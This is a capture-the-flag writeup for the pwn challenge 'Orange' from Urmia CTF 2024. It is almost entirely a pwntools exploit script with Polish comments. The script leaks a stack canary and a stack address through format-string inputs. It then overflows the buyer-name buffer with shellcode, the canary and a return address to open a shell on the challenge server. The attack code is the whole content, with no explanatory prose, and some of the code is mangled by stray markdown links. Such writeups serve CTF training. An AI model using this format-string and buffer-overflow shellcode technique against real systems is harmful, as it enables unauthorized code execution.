---
title: "Orange - Urmia CTF 2024"
category: "pwn"
subcategory: "shellcode"
type: "writeup"
tags: ["pwn", "shellcode", "canary", "checksec", "orange", "urmia-ctf", "urmia-ctf-2024", "2024", "ctf-writeup"]
summary: "from pwn import  #include"
source:
  name: "CTFtime writeup #39458"
  url: "https://ctftime.org/writeup/39458"
ctf:
  name: "Urmia CTF 2024"
  year: 2024
  challenge: "Orange"
---

## Metadata

- **CTF:** Urmia CTF 2024
- **Task:** Orange
- **Author team:** MindCrafters
- **CTFtime:** <https://ctftime.org/writeup/39458>

---
Just code:

```  
from pwn import * #include  
context.log_level='info' #na poczatku mozna  
#context.log_level='debug' #dokladnie pokazuje wyslanie   
#-  
context.update(arch='x86_64', os='linux') #o tym pamietac jak sie nie pobiera danych z pliku  
context.terminal = ['wt.exe','wsl.exe'] #do wsl

binary = context.binary = ELF("./orange", checksec=False)

if args.GDB:  
gdbscript = """  
call puts("Hello from process debugger!")  
b *0x0000000000401196  
"""  
p = process(binary.path)  
elif args.REMOTE:  
address='[orange.uctf.ir](http://orange.uctf.ir)'  
port='5001'   
p=remote(address,port) #laczenie online  
else:  
p = process(binary.path)  


if args.GDB:   
gdb.attach(p,gdbscript)  
pause (3) #wcisnąć c jak sie uruchomi debugger  
#p.sendline(payload)  
p.interactive()

RET=0x000000000040101a

CANARYp=b'%17$p'  
p.sendlineafter(b'Enter your name:',CANARYp)  
info(f"Enter your name: {CANARYp}")  
p.sendlineafter(b'Enter your choice:',b'3')  
info(f"3. Buy Oranges->3")  
p.sendlineafter(b'to buy:',b'1')  
info(f"Enter the number of oranges you want to buy ->1")  
p.sendlineafter(b'Enter your choice:',b'1')  
info(f"1. Show Cart->1")  
p.recvuntil(b"Buyer: ")  
CANARY=p.recvline().strip()  
info (f"CANARY: {CANARY}")   
CANARY=int(CANARY,16)

p.sendlineafter(b'5. Change Buyer Name',b'5')  
info(f"5. Change Buyer Name->5")

STACKp=b'%7$p'  
p.sendlineafter(b'Enter your name:',STACKp)  
info(f"Enter your name: {STACKp}")

p.sendlineafter(b'Enter your choice:',b'1')  
info(f"1. Show Cart->1")  
p.recvuntil(b"Buyer: ")  
STACK=p.recvline().strip()  
STACK=int(STACK,16)+0x10 #ok

info (f"STACK: {hex(STACK)}") 

p.sendlineafter(b'Enter your choice:',b'1')  
info(f"1. Show Cart->1")

gdbscript = """  
#call puts("Hello from process debugger!")  
#start  
#b *main  
#SET_BUYER_NAME  
b *0x0000000000401720  
"""  
#gdb.attach(p,gdbscript)  
#pause (5) #wcisnąć c jak sie uruchomi debugger

p.sendlineafter(b'5. Change Buyer Name',b'5')

info(f"5. Change Buyer Name->5")

SHELLCODE= asm([shellcraft.sh](http://shellcraft.sh)())

payload=SHELLCODE+b'B'*(104-len(SHELLCODE))+p64(CANARY)+p64(RET)+p64(STACK)  
pause (1)  
p.sendlineafter(b'Enter your name:',payload)  
p.interactive()  
```

by Kerszi/MindCrafters
